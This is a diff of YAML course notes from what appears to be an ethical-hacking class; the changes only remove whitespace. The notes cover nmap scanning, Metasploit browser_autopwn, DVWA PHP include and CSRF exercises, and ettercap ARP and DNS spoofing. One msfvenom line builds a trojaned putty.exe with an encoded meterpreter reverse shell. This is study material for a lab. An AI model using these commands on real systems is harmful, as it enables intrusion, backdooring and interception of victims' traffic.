@@ -134,7 +134,7 @@ udemy:
               cmd: tcptraceroute www.google.fr
             - theharvester
               what_for: look for website/ip/mail
-              cmd: 
+              cmd:
                 theharvester -d <website_we_need_info> -l <number_of_line> -b <data_source>
                 theharvester -d www.google.fr -l 100 -b google.com
       - name: 08_machine_list
@@ -189,9 +189,9 @@ udemy:
           cmd:
             nmap 192.168.1.106
             nmap 192.168.1.0/24 # scan all network
-            nmap -sN -p 22,25 192.160.1.106 
-            nmap -sU -p 53,161 192.160.1.106 # UDP 
-            nmap -sV -p 80 192.160.1.106 # HTTP 
+            nmap -sN -p 22,25 192.160.1.106
+            nmap -sU -p 53,161 192.160.1.106 # UDP
+            nmap -sV -p 80 192.160.1.106 # HTTP
             nmap -A 192.160.1.106 # agressiv scan, generate a file myscan.xml
             xsltproc myscan.xml -o myscan.html
         zenmap:
@@ -252,12 +252,12 @@ udemy:
         terminologie:
           exploit: moyen par lequel un attaquand profite d un defaut dans un systeme, une app, ou un service
           payload: code que nous voulons faire executer par le systeme et qui sera delivre par un framework
-          shellcode: suite d instructions utilisees par un payload lors de l exploitation 
-          module: part de logiciel qui peut etre utilise par le framework metasploit 
-          listener: composant qui attend une connexion entrante 
+          shellcode: suite d instructions utilisees par un payload lors de l exploitation
+          module: part de logiciel qui peut etre utilise par le framework metasploit
+          listener: composant qui attend une connexion entrante
         launch: terminal -> msfconsole
         cmd:
-          exploits: 
+          exploits:
             show exploits
             search vnc
             metasploit.com -> exploits
@@ -312,7 +312,7 @@ udemy:
           cmd:
             msfconsole
             use auxilary/server/browser_autopwn
-            show options 
+            show options
             set lhost 192.168.1.106
             set uripath hacking
             run
@@ -323,7 +323,7 @@ udemy:
       - name: 14_backdoor_10
         meterpreter:
           desc: extension of metasploit, use as payload, shell meterpreter, persistance module (metsvc)
-          cmd: 
+          cmd:
             wget https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
             msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.106 lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe
             file hello.exe
@@ -354,12 +354,12 @@ udemy:
           cartographie: get sitemap
           dynamic_site: footprint more than sitemap
         vega:
-          desc: 
+          desc:
             * open source platform to test web appli,
             * test SQL injection, XSS, info dealing,
             cmd:
               vega
-              scan -> start new scan 
+              scan -> start new scan
                 -> enter a base URI for scan
                 -> www.kondah.com
                 -> finish
@@ -368,15 +368,15 @@ udemy:
         burp_suite:
           desc:
             * secu test on web appli
-            * analyse, edit and replay request 
-          cmd: 
+            * analyse, edit and replay request
+          cmd:
             burpsuite
             # seems so better
       - name: 17_vuln_php_12
         desc:
           dvwa: platform to test vuln
           include:
-            desc: 
+            desc:
               <php include('config.php'); ?>
               is use very often
               2 way to exploit
@@ -484,7 +484,7 @@ udemy:
               Speed beginning -> Configure your browser -> Plug-n-Hack
               bowser -> preference -> advanced -> setting
                 -> automatic proxy configure URL -> check
-              zap -> historic -> RMB on a request -> attack -> balayage 
+              zap -> historic -> RMB on a request -> attack -> balayage
                 -> alert
           Mano military: ~
         protect:
@@ -501,7 +501,7 @@ udemy:
           - windos domaine auth
         todo:
           DVWA -> CSRF
-          # you can view src 
+          # you can view src
           # you can see parameter in url
           ctrl+U -> copy form source code
           create csrf.html -> paste code
@@ -510,7 +510,7 @@ udemy:
         protect:
           - add a token, not auto sent, to all  sensible request
           - token must be crypto sure
-          - stock a token and add it to all form and link 
+          - stock a token and add it to all form and link
     section_7_vuln_reseau_66:
       - name: 21_intro_4
         reseau sans fils plus vulnerable que filaire
@@ -597,7 +597,7 @@ udemy:
           nmap 192.168.1.107 -p 90
           nmap -sI 192.168.1.106 192.168.1.107 -p 80
       - name: 23_service_deny_8
-        concept: 
+        concept:
           DOS: resultat d un remplissage d une zone de stockage ou un canal de com jusqu a ce que l on ne puisse plus l utiliser
           Deny of service by smurf:
             desc:
@@ -670,13 +670,13 @@ udemy:
                 -> host -> host list (ctrl+H)
                 -> host -> scan for hosts (ctrl+S)
               Mitm -> ARP poisoning
-                -> sniff remote connection: check 
+                -> sniff remote connection: check
                 -> only poison one-way: check
               Plugins -> Manage the plugins (ctrl+P) -> dns_spoof
               on computer -> cd /etc/ettercap
               vi etter.dns
-              alphorm.com A www.google.com -> alphorm.com A 192.168.133.129 
-              *.alphorm.com A www.google.com -> *.alphorm.com A 192.168.133.129 
+              alphorm.com A www.google.com -> alphorm.com A 192.168.133.129
+              *.alphorm.com A www.google.com -> *.alphorm.com A 192.168.133.129
       - name: 26_man_in_the_middle_13
         tools:
           DriftNet:
@@ -730,7 +730,7 @@ udemy:
         intrusion:
           - regular test
           - audits (EBIOS, MEHARI, ...)
-          - quality test 
+          - quality test
           links:
             - https://www.clusif.asso.fr
         right splitting:
@@ -740,7 +740,7 @@ udemy:
           - suivi
           - threat internal or external
           - threat accidental or not
-        crypt: 
+        crypt:
           - with auth
           - base on solution (Kerberos, PGP, RSA-K)
           - IPSEC
